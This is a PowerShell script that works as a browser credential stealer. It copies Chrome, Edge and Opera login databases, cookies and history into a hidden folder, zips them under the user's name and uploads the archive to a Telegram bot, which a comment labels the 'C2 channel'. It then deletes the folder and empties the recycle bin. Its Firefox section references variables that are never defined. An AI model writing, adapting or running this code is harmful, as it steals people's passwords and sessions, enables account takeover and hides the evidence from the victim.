# Define the destination folder where you want to save the files
$destinationFolder = "$HOME\backup"

# Create the destination folder if it doesn't exist
if (-not (Test-Path $destinationFolder)) {
    New-Item -Path $destinationFolder -ItemType Directory
    attrib +h $destinationFolder
}

# Function to copy a file if it exists, with error handling
function Copy-FileIfExists {
    param (
        [string]$sourcePath,
        [string]$destinationFolder,
        [string]$fileName
    )

    if (Test-Path $sourcePath) {
        Copy-Item -Path $sourcePath -Destination "$destinationFolder\$fileName" -Force
    }
}

# Define the paths for Google Chrome
$chromeLoginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$chromeHistoryPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$chromeCookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"

# Define the paths for Mozilla Firefox
$firefoxProfileFolder = "$env:APPDATA\Mozilla\Firefox\Profiles"

# Define the paths for Microsoft Edge
$edgeLoginDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$edgeHistoryPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
$edgeCookiesPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"

# Define the paths for Opera
$operaLoginDataPath = "$env:APPDATA\Opera Software\Opera Stable\Login Data"
$operaHistoryPath = "$env:APPDATA\Opera Software\Opera Stable\History"
$operaCookiesPath = "$env:APPDATA\Opera Software\Opera Stable\Cookies"

# Try copying Chrome data files, handle errors if Chrome is not installed
try {
    Copy-FileIfExists -sourcePath $chromeLoginDataPath -destinationFolder $destinationFolder -fileName "chrome_login_data"
    Copy-FileIfExists -sourcePath $chromeHistoryPath -destinationFolder $destinationFolder -fileName "chrome_history"
    Copy-FileIfExists -sourcePath $chromeCookiesPath -destinationFolder $destinationFolder -fileName "chrome_cookies"
} catch {}

# Try copying Firefox data files, handle errors if Firefox is not installed
try {
    Copy-FileIfExists -sourcePath $firefoxLoginDataPath.FullName -destinationFolder $destinationFolder -fileName "firefox_logins.json"
    Copy-FileIfExists -sourcePath $firefoxKeyPath.FullName -destinationFolder $destinationFolder -fileName "firefox_key4.db"
} catch {}

# Try copying Edge data files, handle errors if Edge is not installed
try {
    Copy-FileIfExists -sourcePath $edgeLoginDataPath -destinationFolder $destinationFolder -fileName "edge_login_data"
    Copy-FileIfExists -sourcePath $edgeHistoryPath -destinationFolder $destinationFolder -fileName "edge_history"
    Copy-FileIfExists -sourcePath $edgeCookiesPath -destinationFolder $destinationFolder -fileName "edge_cookies"
} catch {}

# Try copying Opera data files, handle errors if Opera is not installed
try {
    Copy-FileIfExists -sourcePath $operaLoginDataPath -destinationFolder $destinationFolder -fileName "opera_login_data"
    Copy-FileIfExists -sourcePath $operaHistoryPath -destinationFolder $destinationFolder -fileName "opera_history"
    Copy-FileIfExists -sourcePath $operaCookiesPath -destinationFolder $destinationFolder -fileName "opera_cookies"
} catch {}

# Prepare for data extraction
$username = $env:USERNAME
$dest_path = "$destinationFolder\$username.zip"
Compress-Archive -Path $destinationFolder -DestinationPath "$dest_path"

# Send to C2 channel: Telegram
curl.exe -F "chat_id=<your_chat_id>" -F "document=@`"$dest_path`"" https://api.telegram.org/bot<your_bot_id>/sendDocument *> $null 2>&1

# Clean up 
Remove-Item $destinationFolder -Recurse -Force; Clear-RecycleBin -Force